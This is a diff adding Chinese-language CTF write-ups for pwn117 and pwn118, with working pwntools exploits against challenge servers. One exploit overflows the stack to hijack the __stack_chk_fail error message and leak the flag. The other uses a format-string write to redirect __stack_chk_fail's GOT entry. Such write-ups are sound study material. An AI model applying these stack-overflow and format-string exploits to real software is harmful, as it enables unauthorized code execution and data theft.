@@ -4082,6 +4082,104 @@ io.sendline(payload)
 io.interactive()
 ```
 
+## pwn117
+
+程序先读flag文件
+
+buf在bss段
+
+后面会直接进gets
+
+那就是很标准的栈溢出了
+
+众所不周知，canary检测失败后就会调用stack_chk_fail函数，输出报错，报错会输出文件名，覆盖文件名指针就能随便读
+
+这个的机制大概情况如下所示（）
+
+[四、技巧篇 - 4.12 利用 __stack_chk_fail - 《CTF 竞赛入门指南(CTF All In One)》 - 书栈网 · BookStack](https://www.bookstack.cn/read/CTF-All-In-One/doc-4.12_stack_chk_fail.md)
+
+覆盖变量__libc_argv[0] 这样我们就可以在canary检测失败时，输出我们想要的flag值
+
+但是这题我觉得这个溢出的字符数有点问题，我没想明白为什么是填入504的垃圾数据，但是就能打通，看一个老哥的博客说应该是改编的时候有点史了，504是照抄的参数
+
+反正exp：
+
+```python
+from pwn import *
+io = remote('pwn.challenge.ctf.show',28170)
+
+flag = 0x06020A0
+payload = b'a' *(504) + p64(flag)
+io.sendline(payload)
+io.interactive()
+
+```
+
+## pwn118
+
+很奇怪，按照116的打法打不出
+
+测出来的canary位置应该是59才对，但是就是打不出
+
+换用劫持stack_chk_fail_got改为getflag函数地址这种方法，就能出
+
+思路就是先找到偏移，这个靠格式化字符串漏洞找就行了
+
+AAAA%p%p%p%p嘛
+
+测出来是第七位
+
+然后就是利用pwn库里面的fmtstr_payload方法，把stack什么什么函数劫持到getflag就好了
+
+exp:
+
+```python
+from pwn import *
+context.log_level = 'debug'
+#io = process('./pwn')
+io = remote('pwn.challenge.ctf.show',28185)
+elf = ELF('./pwn118')
+stack_chk_fail_got = elf.got['__stack_chk_fail']
+getflag = elf.sym['get_flag']
+payload = fmtstr_payload(7, {stack_chk_fail_got: getflag})
+payload = payload.ljust(0x50, b'a')   #0x5C-0xC = 0x50    
+io.sendline(payload)
+io.recv()
+io.interactive()
+
+
+# from pwn import *
+
+# io = remote("pwn.challenge.ctf.show",28185)
+
+# # io = process("./pwn118")
+
+# backdoor = 0x8048586
+
+#
+#
+
+# # leak canary
+
+# leak = io.sendline(b'%59$p')
+
+# io.recvuntil(b'0x')
+
+# canary = int(io.recv()[:8],16)
+
+# print(canary)
+
+#
+
+# payload = b'a' *(0x50) + p32(canary) + b'a'*(0xC) + p32(backdoor)
+
+# io.interactive()
+```
+
+虽然但是，这个底下被注释掉的这种方法为什么不行，总不能是我canary的位置还不对吧，那就太难得去找了
+
+## pwn119
+
 
 
 # 复现平台
